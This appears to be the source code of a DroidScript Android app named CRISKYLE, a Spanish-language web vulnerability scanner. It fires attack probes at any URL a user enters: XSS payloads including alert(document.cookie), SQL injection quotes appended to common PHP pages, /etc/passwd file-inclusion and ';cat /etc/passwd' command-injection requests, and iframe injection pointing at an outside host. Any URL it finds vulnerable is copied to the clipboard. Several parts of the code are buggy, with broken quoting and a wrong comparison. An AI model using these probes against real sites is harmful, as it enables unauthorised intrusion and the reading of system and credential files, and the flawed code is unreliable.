//ORIGINAL APP CODE CRISKYLE DEV 2021 BY - OXSR

cfg.Dark
app.LoadPlugin('DroidScriptUIKit')
app.Alert("Inserta text y clics enter para ejecutar", "Funcionamiento")
app.Alert( "CRISKYLE es una herramienta de escaneo web avanzada para android, gracias por hacer uso de ella ^^.", "Info" );
app.Alert( "¡Hii, Soy VWolf, gracias por hacer uso de mis tools! ^^"  );
function OnStart(){
    lay = MUI.CreateLayout("Linear", "FillXY")

        tab = MUI.CreateTabFixed("SQLi - Scan, XSS - Scan,Whois - Scan,Cookie - Scan ", 1, 1, "VCenter,FillXY", "lime", true)
        tab.SetOnSelect(OnSelect)
							//////////////COMENSA PAG 1///////////////
						
        songsLay = tab.GetLayout("XSS - Scan")
        ted1 = MUI.CreateTEOutlineIconLeft(0.8,null, "language", "URL", true, "#7C4DFF")
        ted1.SetOnEnter(XSS)////////// TEXT I CHILD
        ted1text = app.CreateText( "\nNecesario insertar url\ncon entrada a tastear ej:\nejemplo.com/index.php?id= ", 0.8, 0.15, "Multiline" );
        ted1text.SetTextColor( "FFF000" );
        ted1text.GetTextSize( 18 );
        songsLay.AddChild(ted1)
        songsLay.AddChild(ted1text)
        
       		//////////////COMENSA PAG 2////////////////
        albumsLay = tab.GetLayout("SQLi - Scan")
        ted = MUI.CreateTEOutlineIconLeft(0.8,null, "language", "URL", true, "#7C4DFF")
        ted.SetOnEnter(sqli)////////// TEXT I CHILD
        ted2texto = app.CreateText( "\n\nNecesario insertar url\npara realizar el escaneo:\nej: ejemplo.com\n\nSQLi es una vulnerabilidad critica\nexplotandola, se puede acceder\nen la db de la pag.", 0.8, 0.30, "Multiline" );
        ted2texto.SetTextColor( "gold" );
        ted2texto.SetTextSize( 18 );
        albumsLay.AddChild(ted)
        albumsLay.AddChild(ted2texto)
        
							////////////COMENSA PAG 3////////////////
        artistsLay = tab.GetLayout("Whois - Scan")
        ted3 = MUI.CreateTEOutlineIconLeft(0.8,null, "language", "URL", true, "#7C4DFF")
        ted3.SetOnEnter(Whois)////////// TEXT I CHILD
        ted3texto = app.CreateText( "\n\nNecesario insertar url\npara realizar el escaneo:\nej: ejemplo.com\n\nWhois es un protocolo para obtener\n informacion de una IP/Web.", 0.8, 0.30, "Multiline" );
        ted3texto.SetTextColor( "gold" );
        ted3texto.SetTextSize( 18 );
        artistsLay.AddChild(ted3)
        artistsLay.AddChild(ted3texto)
        
        		//////////////COMENSA PAG 4////////////////
        artistsLay = tab.GetLayout("Cookie - Scan ")
        ted4 = MUI.CreateTEOutlineIconLeft(0.8,null, "language", "URL", true, "#7C4DFF")
        ted4.SetOnEnter(OnEnter)
        ted4texto = app.CreateText( "\n\nNecesario insertar url\npara realizar el escaneo:\nej: ejemplo.com\n\n no asegurados provocan la\nvulnerabilidad de ataques MITM. ", 0.8, 0.30, "Multiline" );
        ted4texto.SetTextSize( 18 );
        ted4texto.SetTextColor( "white" );
        artistsLay.AddChild(ted4)
        artistsLay.AddChild(ted4texto)
        lay.AddChild(tab)
        
        
    app.AddLayout(lay)
    
    app.SetMenu( "Start,Stop,Pause" );

///BOTO DALT/////

function lista(otros)
{
	if(otros == "FLI"){
		fli();
	} else if(otros == "Iframe"){
		iframe();
	} else if(otros == "Autor"){
		app.Alert( "Autor: VWolf\n\nPolitica:\nLa app no recoge ni pide datos sobre el usuario, así tampoco, ningún permiso\n\nDudas o sugerencias: virtualwolfapp@gmail.com" );
	} else if(otros == "Command Iny"){
	    cmdinjeccion();
	} else if(otros == "Versión"){
	    version();
	} else {
			examenrapido();
		
	}
}
    dlg = app.CreateListDialog( "Otras", "FLI,Iframe,Command Iny,Examen rápido,Autor" );
    dlg.SetOnTouch( lista )
    dlg.Show();
dlg.Hide();
    lay3 = app.CreateLayout( "frame", "Bottom" );

    btn3 = app.CreateButton( "[fa-bug]", -1, -1, "fontawesome" );
    btn3.SetMargins( 0.01, 0.08, 0.01, 0 );
    btn3.SetOnTouch( dlg.Show);
    lay3.AddChild( btn3 );
    app.AddLayout(lay3)
    dlg.Hide();
    //////////////////////////FIII PAGS///////////////////////
    
}

function OnSelect(name)
{
    if( name == "XSS - Scan"){
    ban = MUI.CreateBanner("XSS vulnerabilidad que permite al atacante ejecutar scripts en el navegador de la víctima grabedad 6-8/10", "LEER MÁS", "CERRAR")
    		ban.SetOnTouch(OnTouch)
    		ban.Show()/////FI BAN 1//////
    }else if( name == "SQLi - Scan"){
    ban = MUI.CreateBanner("SQLi vulnerabilidad en la base de datos, grabedad 9/10", "LEER MÁS", "CERRAR")
    		ban.SetOnTouch(OnTouch)
    		ban.Show()/////FI BAN 2/////
    }else if( name == "Whois - Scan"){
    ban = MUI.CreateBanner("Whois es utilizado para escanear una web al lado del servidor/dns..", "LEER MÁS", "CERRAR")
    		ban.SetOnTouch(OnTouch)
    		ban.Show()/////FI BAN 3////
    }else if( name == "Cookie - Scan"){
    ban = MUI.CreateBanner("Vulnerabilidad de cookie, comunes en sitios web capaces de secruestar credenciales, grabedad 4-8/10.", "LEER MÁS", "CERRAR")
    		ban.SetOnTouch(OnTouch)
    		ban.Show()/////FI BAN 4////
    }
 }
 /////////////////////////////////////////////////////
 ////////////////COOKIE FUNCTION/////////////////
 /////////////////////////////////////////////////////
 
    function OnEnter(){
{
	app.HideKeyboard();
    lay = app.CreateLayout( "linear" );
		
    web = app.CreateWebView( 0, 0, "ignoreerrors" );
    lay.AddChild( web );

    txt = app.CreateTextEdit( "", 0, .0, "ReadOnly,NoKeyboard" );
    txt.SetTextSize( 12 );
    lay.AddChild( txt );

    app.AddLayout( lay );

    net = app.CreateNetClient( "TCP,Raw" );
    net.SetOnConnect( net_OnConnect );
    net.Connect( ""+this.GetText(), 80 );
}

function net_OnConnect( connected )
{
    if( !connected ) return app.ShowPopup( "¡Fallo al conectar!" );

    net.SendText( "GET / HTTP/1.1\r\nHost:"+" "+this.GetText+"\r\n\r\n", "UTF-8" );
    var msg = "", s = "";
    do msg += s = net.ReceiveText( "UTF-8" );
    while( s.length > 0 );
    var resultado = msg ;
 /////////////////////////////////////////////////////
////////ANALITZAF COOKIE///////////////////////
  var n = resultado.search("HttpOnly");
  if(n == "-1"){
    alert("Vul HttpOnly = True");
  }else{
    alert("Vul HttpOnly = False");
 }
 var n = resultado.search("Secure");
  if(n == "-1"){
    alert("Vul Secure Cookie = True")
    informe();
    function informe() {
        
        ynd = app.CreateYesNoDialog( "Desea generar un informe por Email sobre la vulnerabilidad?" );
        ynd.SetButtonText("Si","No");
        ynd.SetOnTouch( Ynd_OnTouch );
        ynd.Show();
        
        } function Ynd_OnTouch( result ) {
        
        if(result = "No"){
        app.SendMail( "maildelapaginaareportar@ejemplo.com", "Report Vul  Secure", "Hello, from CRISKYLE, I found a non-secure cookie vulnerability on your page ("+this.GetText+"), it is a burn vulnerability, where it affects the credentials of the page, such as the user's login, allowing the attacker to execute an MITM attack (man in the middle ) and sniff the outgoing network traffic, to solve the vulnerability, answer me the mail, thanks :)" );
        }
        else {}
            }

  }else{
    alert("Vul Secure Cookie  = False")
  }
  
    var text = "Cookie completa copiada en Portapapeles."
    alr = MUI.CreateAlert(text, "new_releases")
    alr.Show()

    setTimeout(CloseAlert, 6000)


function CloseAlert(){
    alr.Hide()
}

  app.SetClipboardText(" "+msg );
  ///////////FI ANALITZAR//////////
  
    web.LoadHtml( msg );

    net.Disconnect();
}
/////////////////////////////////////////////////////
///////////FI COOKIE///////COMENSA BANNER////////////////
/////////////////////////////////////////////////////
}


function OnTouch(v){
    if(v)
        app.OpenUrl( "https://owasp.org/www-project-top-ten/" );
}

/////////////////////FI BANNER///////////////////////////
///////////////////////////////////////////////////////////
///////////////COMENSA XSS SCAN/////////////////////

function XSS(){
    app.HideKeyboard();
    var lol = app.GetClipboardText();
    var porta = lol
    var url = this.GetText()
	app.ShowPopup( "Escaneando...." );
    lay = app.CreateLayout( "linear", "VCenter,FillXY" );
    web = app.CreateWebView( 0, 0, "IgnoreErrors" );
    lay.AddChild( web );
    app.AddLayout( lay );
    web.LoadUrl( "http://"+url+"#default=<script>alert(document.cookie)</script>")
    app.SetClipboardText( "http://"+url+"#default=<script>alert(document.cookie)</script>");
setTimeout(XSS1, 3500);
    function XSS1(){

        app.ShowPopup( "Método 2..." );
	    lay = app.CreateLayout( "linear", "VCenter,FillXY" );
        web = app.CreateWebView( 0, 0, "IgnoreErrors" );
        lay.AddChild( web );
        app.AddLayout( lay );
        web.LoadUrl( "http://"+url+"<ScriPt>alert('VULNERABLE / VUL COPIADA EN PORTAPAPELES'')</ScriPt>");
        app.SetClipboardText( "http://"+url+"<ScriPt>alert('XSS')</ScriPt>")
        setTimeout(XSS2, 3500);
        function XSS2(){

            app.ShowPopup( "Método 3..." );
	        lay = app.CreateLayout( "linear", "VCenter,FillXY" );
            web = app.CreateWebView( 0, 0, "IgnoreErrors" );
            lay.AddChild( web );
            app.AddLayout( lay );
            web.LoadUrl( "http://"+url+"<body onLoad='while(true) alert('VULNERABLE / VUL COPIADA EN PORTAPAPELES'');'>");
            setTimeout(XSS6, 3500);
            function XSS6(){

                app.ShowPopup( "Método 4..." );
	            lay = app.CreateLayout( "linear", "VCenter,FillXY" );
                web = app.CreateWebView( 0, 0, "IgnoreErrors" );
                lay.AddChild( web );
                app.AddLayout( lay );
                web.LoadUrl( "http://"+url+"<body onLoad='while(true) alert('VULNERABLE / VUL COPIADA EN PORTAPAPELES'');'>");
                app.SetClipboardText( "http://"+url+"<body onLoad='while(true) alert('XSS);'>" );
                setTimeout(XSS3, 3500);
                function XSS3(){

                    app.ShowPopup( "Método 5..." );
	                lay = app.CreateLayout( "linear", "VCenter,FillXY" );
                    web = app.CreateWebView( 0, 0, "IgnoreErrors" );
                    lay.AddChild( web );
                    app.AddLayout( lay );
                    web.LoadUrl( "http://"+url+"<IMG DYNSRC='javascript:alert('VULNERABLE / VUL COPIADA EN PORTAPAPELES'')'>");
                    app.SetClipboardText( "http://"+url+"<IMG DYNSRC='javascript:alert('XSS')'>" );
                    setTimeout(XSS5, 3500);}

                    function XSS5(){
	                    app.Alert( "¡Vul XSS no encontrada!" );
	                    app.SetClipboardText( ""+lol );
                    	OnStart();
                }
            }
        }
    }
}
/////////////////////FI XSS////////////////////////////////
///////////////////////////////////////////////////////////
//////////////COMENSA WHOIS  SCAN//////////////////

function Whois(){
    app.Alert( "Por riesgos en la visión, el brillo de la App a sido bajado al mínimo, debido al cambio de tema oscuro a claro de manera inmediata." );
    app.HideKeyboard();
	app.SetScreenMode( "full" );
    lay = app.CreateLayout( "linear", "VCenter,FillXY" );
    web = app.CreateWebView( 1, 1, "IgnoreErrors" );
    lay.AddChild( web );
    app.AddLayout( lay );
    web.LoadUrl( "https://es.godaddy.com/whois/results.aspx?checkAvail=1&domain="+this.GetText()+" " );
    ///////BOTO SALIR///////
    lay2 = app.CreateLayout( "Linear", "VCenter,FillXY" );
    lay2.SetMargins( 0.48,0.79,0,0 );
    btn = app.CreateButton( "Salir",null, null, "Custom");
    btn.SetOnTouch( salir );
    lay2.AddChild( btn );
		btn.SetBackColor( "black" );
		 app.AddLayout( lay2 );
  /////BRILLO////

}function salir(){
    app.SetScreenMode( "normal" );
OnStart();
}
///////////////////////////////
///////////!!!!!!!SQLI///////////
function sqli(){
    app.ShowPopup( "Analizando..." );
    var url = this.GetText()
    var address = "http://"+url+"/index.php?id=1%27";
    app.HttpRequest( "GET", address, null, null, handleReply );
    function handleReply( error, reply ){
        if( error ) alert( reply );
        else{
        var funfact = reply.slice( reply.indexOf("<i>") + 3, reply.indexOf("</i>") );
        var salida = funfact
        var sqli = salida.search("SQL");
        }if(sqli  == "-1"){
            sqli2();
        }else{
            alert("Vul SQLi = True")
            app.SetClipboardText( "http://"+url+"/index.php?id=1%27" );
            app.Alert( "URL vul copiado en portapapeles" );
  		}
    }
  //////INICI 2//////
function sqli2(){
    var address = "http://"+url+"/products.php?id=1%27";
    app.HttpRequest( "GET", address, null, null, handleReply );
        function handleReply( error, reply ){
            if( error ) alert( reply );
            else{
            var funfact = reply.slice( reply.indexOf("<i>") + 3, reply.indexOf("</i>") );
            var salida = funfact
            var sqli = salida.search("SQL");
            }if(sqli  == "-1"){
                sqli3();
            }else{
                alert("Vul SQLi = True")
                app.SetClipboardText( "http://"+url+"/products.php?id=1%27" );
                app.Alert( "URL vul copiado en portapapeles" );
		    }
      }
 ///////inici 3////////
function sqli3(){
    var address = "http://"+url+"/news.php?id=1%27";
    app.HttpRequest( "GET", address, null, null, handleReply );
        function handleReply( error, reply ){
            if( error ) alert( reply );
            else{
            var funfact = reply.slice( reply.indexOf("<i>") + 3, reply.indexOf("</i>") );
            var salida = funfact
            var sqli = salida.search("SQL");
            }if(sqli  == "-1"){
                sqli4();
            }else{
                alert("Vul SQLi = True")
                app.SetClipboardText( "http://"+url+"/news.php?id=1%27" );
                app.Alert( "URL vul copiado en portapapeles" );
 		}
	 }
 ///////inici 4///////
function sqli4(){
    var address = "http://"+url+"/category.php?id=1%27";
    app.HttpRequest( "GET", address, null, null, handleReply );
        function handleReply( error, reply ){
            if( error ) alert( reply );
            else{
            var funfact = reply.slice( reply.indexOf("<i>") + 3, reply.indexOf("</i>") );
            var salida = funfact
            var sqli = salida.search("SQL");
            }if(sqli  == "-1"){
                sqli5();
            }else{
                alert("Vul SQLi = True")
                app.SetClipboardText( "http://"+url+"/category.php?id=1%27" );
                app.Alert( "URL vul copiado en portapapeles" );
  		}
  	}
 ///////inici 5///////
function sqli5(){
    var address = "http://"+url+"/index.html?id=1%27";
    app.HttpRequest( "GET", address, null, null, handleReply );
        function handleReply( error, reply ){
            if( error ) alert( reply );
            else{
                var webfuente = reply.slice( reply.indexOf("<i>") + 3, reply.indexOf("</i>") );
                var salida = webfuente
                var sqli = salida.search("SQL");
            }if(sqli  == "-1"){
                alert("Vul SQLi = False")
            }else{
                alert("Vul SQLi = True")
                app.SetClipboardText( "http://"+url+"/index.html?id=1%27" );
                    app.Alert( "URL vul copiado en portapapeles" );
								}
							}	
						}
					}
				}
			}
		}
		
		function fli(){
    var url = prompt("Inserte URL Web (ejemplo.com):")
     app.ShowPopup( "Analizando..." );
    var addresss = "http://"+url+"/?page=/etc/passwd";
    app.HttpRequest( "GET", addresss, null, null, handleReply );
    function handleReply( error, reply ){
        if( error ) alert( reply );
        else{
        var funfact = reply.slice( reply.indexOf("<i>") + 3, reply.indexOf("</i>") );
        var salida = funfact
        var fli = salida.search("sbin");
        }if(fli  == -1){
           app.Alert("No vulnerable")
        }else{
        app.Alert("Web Vulnerable")
            app.SetClipboardText( "http://"+url+"/page=/etc/passwd" );
            app.Alert( "URL vul copiado en portapapeles" );
  		}
    }
    }
    function iframe(){
    var url = prompt("Inserte URL Web (ejemplo.com/index.php?id=):")
     app.ShowPopup( "Analizando..." );
    var addresss = "http://"+url+"<iframe src=https://tayfu.ml/>";
    app.HttpRequest( "GET", addresss, null, null, handleReply );
    function handleReply( error, reply ){
        if( error ) alert( reply );
        else{
        var funfact = reply.slice( reply.indexOf("<i>") + 3, reply.indexOf("</i>") );
        var salida = funfact
        var fli = salida.search("Acortador");
        }if(fli  == -1){
            app.Alert("No vulnerable")
        }else{
        		alert("Web Vulnerable")
            app.SetClipboardText( "http://"+url+"<iframe src=httpps://tayfu.ml>" );
            app.Alert( "URL vul copiado en portapapeles" );
   
	    }
	}
}function cmdinjeccion(){
    var url = prompt("Inserte URL Web (ejemplo.com):")
     app.ShowPopup( "Analizando..." );
    var addresss = "http://"+url+"?dir=%3Bcat%20/etc/passwd";
    app.HttpRequest( "GET", addresss, null, null, handleReply );
    function handleReply( error, reply ){
        if( error ) alert( reply );
        else{
        var funfact = reply.slice( reply.indexOf("<i>") + 3, reply.indexOf("</i>") );
        var salida = funfact
        var fli = salida.search("sbin");
        }if(fli  == -1){
            app.Alert("Web no Vulnerable")
        }else{
        app.Alert("Web Vulnerable")
            app.SetClipboardText( "http://"+url+"?dir=%3Bcat%20/etc/passwd" );
            app.Alert( "URL vul copiado en portapapeles" );
            
  		}
    }
} function version(){
    var vaddress = "https://vwolf3.000webhostapp.com/version.html";
    app.HttpRequest( "GET", vaddress, null, null, handleReply );
    function handleReply( error, reply ){
        if( error ) alert( reply );
        else{
        var funfact = reply.slice( reply.indexOf("<i>") + 3, reply.indexOf("</i>") );
        var salida = funfact
        var v = salida.search("3.1");
        }if(v  == "-1"){
        		app.Alert("¡App Actualizada!")      
        }else{
            app.Alert("Actualización pendiente")
            app.OpenUrl("")
  		}
    }
    }
//-----------------------------------------------------------EXAMEN NO VA
function examenrapido(){
    var web = prompt("Inserte sitio web ej. (ejemplo.com)")
        var addresssql = "http://"+web+"/index.php?id=1%27";
    app.HttpRequest( "GET", addresssql, null, null, handleReply );
        function handleReply( error, reply ){
            if( error ) alert( reply );
            else{
            var funfact = reply.slice( reply.indexOf("<i>") + 3, reply.indexOf("</i>") );
            var salida = funfact
            var sqli = salida.search("SQL");
            }if(sqli  == "-1"){
                var sql = "No vulnerable"
                xssexam();
            }else{
                var sql = "Vulnerable"
                xssexam();
            }
    //}
    function xssexam(){
        var addresssql = "http://"+web+"/index.php?url=http://tayfu.ml";
    app.HttpRequest( "GET", addresssql, null, null, handleReply );
        function handleReply( error, reply ){
            if( error ) alert( reply );
            else{
            var funfact = reply.slice( reply.indexOf("<i>") + 3, reply.indexOf("</i>") );
            var salida = funfact
            var sqli = salida.search("Acortador");
            }if(sqli  == "Acortador"){
                var xss = "Vulnerable"
                iframexam();
            }else{
                var xss = "No vulnerable"
                iframexam();
            }
    
    
    function iframexam(){
    var addresss = "http://"+web+"/index.php/id=<iframe src=https://tayfu.ml/>";
    app.HttpRequest( "GET", addresss, null, null, handleReply );
    function handleReply( error, reply ){
        if( error ) alert( reply );
        else{
        var funfact = reply.slice( reply.indexOf("<i>") + 3, reply.indexOf("</i>") );
        var salida = funfact
        var fli = salida.search("Acortador");
        }if(fli  == "Acortador"){
            var iframe = "Vulnerable"
            cmdinjection();
        }else{
            var iframe = "No vulnerable"
            cmdinjeccionn();
        }
        
        function cmdinjeccionn(){
     app.ShowPopup( "Analizando..." );
    var addresss = "http://"+web+"?dir=%3Bcat%20/etc/passwd";
    app.HttpRequest( "GET", addresss, null, null, handleReply );
    function handleReply( error, reply ){
        if( error ) alert( reply );
        else{
        var funfact = reply.slice( reply.indexOf("<i>") + 3, reply.indexOf("</i>") );
        var salida = funfact
        var fli = salida.search("sbin");
        }if(fli  == -1){
            var cmdinj = "No Vulnerable"
        }else{
        		var cmdinj = "Vulnerable"
        }
   	    app.Alert("SQL = "+sql+"\nXSS = "+xss+"\nIframe Inj = "+iframe+"\nCommand inj = "+cmdinj)


                            }
                        }
                    }
                }
            }
        }
    }
}
//*/

/*Blind Out-of-band Remote Code Execution ----- $message = "wrong answer";
echo "<script type='text/javascript'>alert('$message');</script>"; */

//REDIRECCIÓN http://example.com/example.php?url=http://malicious.example.com

/*
function iframe(){
	var url = prompt("Inserte URL Web (ejemplo.com/index.html?id=):")
app.HideKeyboard();
	app.SetScreenMode( "full" );
    lay5 = app.CreateLayout( "linear", "VCenter,FillXY" );
    web2 = app.CreateWebView( 1, 1, "IgnoreErrors" );
    lay5.AddChild( web2 );
    app.AddLayout( lay5 );
    web2.LoadUrl( "http://"+url+"<iframe src=https://tayfu.ml/>" );
    ///////BOTO SALIR///////
    lay4 = app.CreateLayout( "Linear", "VCenter,FillXY" );
    lay4.SetMargins( 0.48,0.79,0,0 );
    btn = app.CreateButton( "Salir",null, null, "Custom");
    btn.SetOnTouch( salir );
    lay4.AddChild( btn );
		btn.SetBackColor( "black" );
		 app.AddLayout( lay4 );
  /////BRILLO////

}
*/

		